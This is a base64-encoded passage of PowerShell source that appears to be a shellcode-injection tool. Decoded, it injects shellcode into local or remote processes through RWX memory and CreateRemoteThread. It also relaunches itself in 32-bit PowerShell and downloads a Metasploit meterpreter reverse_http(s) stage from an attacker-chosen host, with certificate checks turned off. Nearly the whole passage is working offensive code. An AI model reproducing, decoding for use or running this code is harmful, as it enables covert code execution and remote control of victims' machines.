CAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkQ2FsbFN0dWIKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtUmVtb3RlU2hlbGxjb2RlIChbSW50XSAkUHJvY2Vzc0lEKQogICAgewogICAgICAgICMgT3BlbiBhIGhhbmRsZSB0byB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50bwogICAgICAgICRoUHJvY2VzcyA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY2Vzc0lEKSAjIFByb2Nlc3NBY2Nlc3NGbGFncy5BbGwgKDB4MDAxRjBGRkYpCiAgICAgICAgCiAgICAgICAgaWYgKCEkaFByb2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIG9wZW4gYSBwcm9jZXNzIGhhbmRsZSBmb3IgUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgJElzV293NjQgPSAkZmFsc2UKCiAgICAgICAgaWYgKCQ2NGJpdENQVSkgIyBPbmx5IHBlcmZvcm0gdGhlc2VzIGNoZWNrcyBpZiBDUFUgaXMgNjQtYml0CiAgICAgICAgewogICAgICAgICAgICAjIERldGVybWluZSBpcyB0aGUgcHJvY2VzcyBzcGVjaWZpZWQgaXMgMzIgb3IgNjQgYml0CiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzcy5JbnZva2UoJGhQcm9jZXNzLCBbUmVmXSAkSXNXb3c2NCkgfCBPdXQtTnVsbAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCghJElzV293NjQpIC1hbmQgJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ1VuYWJsZSB0byBpbmplY3QgNjQtYml0IHNoZWxsY29kZSBmcm9tIHdpdGhpbiAzMi1iaXQgUG93ZXJzaGVsbC4gVXNlIHRoZSA2NC1iaXQgdmVyc2lvbiBvZiBQb3dlcnNoZWxsIGlmIHlvdSB3YW50IHRoaXMgdG8gd29yay4nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSXNXb3c2NCkgIyAzMi1iaXQgV293NjQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0luamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4nCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlICMgNjQtYml0IHByb2Nlc3MKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlICMgMzItYml0IENQVQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CgogICAgICAgICMgUmVzZXJ2ZSBhbmQgY29tbWl0IGVub3VnaCBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MgdG8gaG9sZCB0aGUgc2hlbGxjb2RlCiAgICAgICAgJFJlbW90ZU1lbUFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZU1lbUFkZHIpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlTWVtQWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgaW50byB0aGUgcHJldmlvdXNseSBhbGxvY2F0ZWQgbWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJGhQcm9jZXNzLCAkUmVtb3RlTWVtQWRkciwgJFNoZWxsY29kZSwgJFNoZWxsY29kZS5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCgogICAgICAgIGlmICgkSXNXb3c2NCkKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgMzItYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjIEJ1aWxkIDY0LWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgaW5saW5lIGFzc2VtYmx5IHN0dWIKICAgICAgICAkUmVtb3RlU3R1YkFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGgsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICAKICAgICAgICBpZiAoISRSZW1vdGVTdHViQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZVN0dWJBZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBXcml0ZSAzMi1iaXQgYXNzZW1ibHkgc3R1YiB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkgc3BhY2UKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVTdHViQWRkciwgJENhbGxTdHViLCAkQ2FsbFN0dWIuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgogICAgICAgICMgRXhlY3V0ZSBzaGVsbGNvZGUgYXMgYSByZW1vdGUgdGhyZWFkCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRSZW1vdGVTdHViQWRkciwgJFJlbW90ZU1lbUFkZHIsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIAogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHJlbW90ZSB0aHJlYWQgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgIyBDbG9zZSBwcm9jZXNzIGhhbmRsZQogICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJGhQcm9jZXNzKSB8IE91dC1OdWxsCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1Mb2NhbFNoZWxsY29kZQogICAgewogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KSB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTY0IHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgIAogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHNoZWxsY29kZQogICAgICAgICRCYXNlQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICBpZiAoISRCYXNlQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRCYXNlQWRkcmVzcy5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgdG8gUldYIGJ1ZmZlcgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFNoZWxsY29kZSwgMCwgJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCkKICAgICAgICAKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKICAgICAgICAKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciA2NAogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQoKICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSB0aHJlYWQgY2FsbCBzdHViCiAgICAgICAgJENhbGxTdHViQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJENhbGxTdHViQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1Yi4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQ2FsbFN0dWJBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IGNhbGwgc3R1YiB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkQ2FsbFN0dWIsIDAsICRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGgpCgogICAgICAgICMgTGF1bmNoIHNoZWxsY29kZSBpbiBpdCdzIG93biB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIDAsICRDYWxsU3R1YkFkZHJlc3MsICRCYXNlQWRkcmVzcywgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggdGhyZWFkLiIKICAgICAgICB9CgogICAgICAgICMgV2FpdCBmb3Igc2hlbGxjb2RlIHRocmVhZCB0byB0ZXJtaW5hdGUKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFRocmVhZEhhbmRsZSwgMHhGRkZGRkZGRikgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgIyBBIHZhbGlkIHBvaW50ZXIgdG8gSXNXb3c2NFByb2Nlc3Mgd2lsbCBiZSByZXR1cm5lZCBpZiBDUFUgaXMgNjQtYml0CiAgICAkSXNXb3c2NFByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBJc1dvdzY0UHJvY2VzcwogICAgaWYgKCRJc1dvdzY0UHJvY2Vzc0FkZHIpCiAgICB7CiAgICAJJElzV293NjRQcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAJJElzV293NjRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJElzV293NjRQcm9jZXNzQWRkciwgJElzV293NjRQcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgJDY0Yml0Q1BVID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgIAkkNjRiaXRDUFUgPSAkZmFsc2UKICAgIH0KCiAgICBpZiAoW0ludFB0cl06OlNpemUgLWVxIDQpCiAgICB7CiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICR0cnVlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICRmYWxzZQogICAgfQoKICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ01ldGFzcGxvaXQnKQogICAgewogICAgICAgIGlmICghJFBvd2VyU2hlbGwzMmJpdCkgewogICAgICAgICAgICAjIFRoZSBjdXJyZW50bHkgc3VwcG9ydGVkIE1ldGFzcGxvaXQgcGF5bG9hZHMgYXJlIDMyLWJpdC4gVGhpcyBibG9jayBvZiBjb2RlIGltcGxlbWVudHMgdGhlIGxvZ2ljIHRvIGV4ZWN1dGUgdGhpcyBzY3JpcHQgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbAogICAgICAgICAgICAjIEdldCB0aGlzIHNjcmlwdCdzIGNvbnRlbnRzIGFuZCBwYXNzIGl0IHRvIDMyLWJpdCBwb3dlcnNoZWxsIHdpdGggdGhlIHNhbWUgcGFyYW1ldGVycyBwYXNzZWQgdG8gdGhpcyBmdW5jdGlvbgoKICAgICAgICAgICAgIyBQdWxsIG91dCBqdXN0IHRoZSBjb250ZW50IG9mIHRoZSB0aGlzIHNjcmlwdCdzIGludm9jYXRpb24uCiAgICAgICAgICAgICRSb290SW52b2NhdGlvbiA9ICRNeUludm9jYXRpb24uTGluZQoKICAgICAgICAgICAgJFJlc3BvbnNlID0gJFRydWUKICAgICAgICAKICAgICAgICAgICAgaWYgKCAkRm9yY2UgLW9yICggJFJlc3BvbnNlID0gJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAiRG8geW91IHdhbnQgdG8gbGF1bmNoIHRoZSBwYXlsb2FkIGZyb20geDg2IFBvd2Vyc2hlbGw/IiwKICAgICAgICAgICAgICAgICAgICJBdHRlbXB0IHRvIGV4ZWN1dGUgMzItYml0IHNoZWxsY29kZSBmcm9tIDY0LWJpdCBQb3dlcnNoZWxsLiBOb3RlOiBUaGlzIHByb2Nlc3MgdGFrZXMgYWJvdXQgb25lIG1pbnV0ZS4gQmUgcGF0aWVudCEgWW91IHdpbGwgYWxzbyBzZWUgc29tZSBhcnRpZmFjdHMgb2YgdGhlIHNjcmlwdCBsb2FkaW5nIGluIHRoZSBvdGhlciBwcm9jZXNzLiIgKSApICkgeyB9CiAgICAgICAgCiAgICAgICAgICAgIGlmICggISRSZXNwb25zZSApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gbGF1bmNoIHRoZSAzMi1iaXQgcGF5bG9hZCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsLiBFeGl0IGZ1bmN0aW9uCiAgICAgICAgICAgICAgICBSZXR1cm4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBTaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgcnVuIGluIGEgbm9uaW50ZXJhY3RpdmUgaW5zdGFuY2Ugb2YgUG93ZXJTaGVsbCwgbWFrZSBzdXJlIHRoZSAtRm9yY2Ugc3dpdGNoIGlzIGluY2x1ZGVkIHNvIHRoYXQgdGhlcmUgaXMgbm8gd2FybmluZyBwcm9tcHQuCiAgICAgICAgICAgIGlmICgkTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1snRm9yY2UnXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIgogICAgICAgICAgICAgICAgJENvbW1hbmQgPSAiZnVuY3Rpb24gJCgkTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSB7YG4iICsgJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuU2NyaXB0QmxvY2sgKyAiYG59YG4kKCRSb290SW52b2NhdGlvbilgbmBuIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIC1Gb3JjZSIKICAgICAgICAgICAgICAgICRDb21tYW5kID0gImZ1bmN0aW9uICQoJE15SW52b2NhdGlvbi5JbnZvY2F0aW9uTmFtZSkge2BuIiArICRNeUludm9jYXRpb24uTXlDb21tYW5kLlNjcmlwdEJsb2NrICsgImBufWBuJCgkUm9vdEludm9jYXRpb24pIC1Gb3JjZWBuYG4iCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRDb21tYW5kQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBc2NpaS5HZXRCeXRlcygkQ29tbWFuZCkKICAgICAgICAgICAgJEVuY29kZWRDb21tYW5kID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkQ29tbWFuZEJ5dGVzKQoKICAgICAgICAgICAgJEV4ZWN1dGUgPSAnJENvbW1hbmQnICsgIiB8ICRFbnY6d2luZGlyXFN5c1dPVzY0XFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtQ29tbWFuZCAtIgogICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkRXhlY3V0ZSB8IE91dC1OdWxsCgogICAgICAgICAgICAjIEV4aXQgdGhlIHNjcmlwdCBzaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgYmUgcnVubmluZyBmcm9tIHg4NiBQb3dlclNoZWxsCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSBrbm93IHdoYXQgeW91J3JlIGRvaW5nPyIsCiAgICAgICAgICAgICAgICJBYm91dCB0byBkb3dubG9hZCBNZXRhc3Bsb2l0IHBheWxvYWQgJyQoJFBheWxvYWQpJyBMSE9TVD0kKCRMaG9zdCksIExQT1JUPSQoJExwb3J0KSIgKSApICkgeyB9CiAgICAgICAgCiAgICAgICAgaWYgKCAhJFJlc3BvbnNlICkKICAgICAgICB7CiAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gY2Fycnkgb3V0IGRvd25sb2FkIG9mIE1ldGFzcGxvaXQgcGF5bG9hZC4gRXhpdCBmdW5jdGlvbgogICAgICAgICAgICBSZXR1cm4KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgc3dpdGNoICgkUGF5bG9hZCkKICAgICAgICB7CiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTU0wgPSAncycKICAgICAgICAgICAgICAgICMgQWNjZXB0IGludmFsaWQgY2VydGlmaWNhdGVzCiAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JFRydWV9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCRMZWdhY3kpIAogICAgICAgIHsKICAgICAgICAgICAgIyBPbGQgTWV0ZXJwcmV0ZXIgaGFuZGxlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwCiAgICAgICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS9JTklUTSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUmVxdWVzdGluZyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gJFJlcXVlc3QiCiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICMgR2VuZXJhdGUgYSBVUkkgdGhhdCBwYXNzZXMgdGhlIHRlc3QKICAgICAgICAgICAgJENoYXJBcnJheSA9IDQ4Li41NyArIDY1Li45MCArIDk3Li4xMjIgfCBGb3JFYWNoLU9iamVjdCB7W0NoYXJdJF99CiAgICAgICAgICAgICRTdW1UZXN0ID0gJEZhbHNlCgogICAgICAgICAgICB3aGlsZSAoJFN1bVRlc3QgLWVxICRGYWxzZSkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRHZW5lcmF0ZWRVcmkgPSAkQ2hhckFycmF5IHwgR2V0LVJhbmRvbSAtQ291bnQgNAogICAgICAgICAgICAgICAgJFN1bVRlc3QgPSAoKFtpbnRbXV0gJEdlbmVyYXRlZFVyaSB8IE1lYXN1cmUtT2JqZWN0IC1TdW0pLlN1bSAlIDB4MTAwIC1lcSA5MikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFJlcXVlc3RVcmkgPSAtam9pbiAkR2VuZXJhdGVkVXJpCgogICAgICAgICAgICAkUmVxdWVzdCA9ICJodHRwJCgkU1NMKTovLyQoJExob3N0KTokKCRMcG9ydCkvJCgkUmVxdWVzdFVyaSkiIAogICAgICAgIH0KICAgICAgICAgICAKICAgICAgICAkVXJpID0gTmV3LU9iamVjdCBVcmkoJFJlcXVlc3QpCiAgICAgICAgJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAkV2ViQ2xpZW50LkhlYWRlcnMuQWRkKCd1c2VyLWFnZW50JywgIiRVc2VyQWdlbnQiKQogICAgICAgIAogICAgICAgIGlmICgkUHJveHkpCiAgICAgICAgewogICAgICAgICAgICAkV2ViUHJveHlPYmplY3QgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViUHJveHkKICAgICAgICAgICAgJFByb3h5QWRkcmVzcyA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRl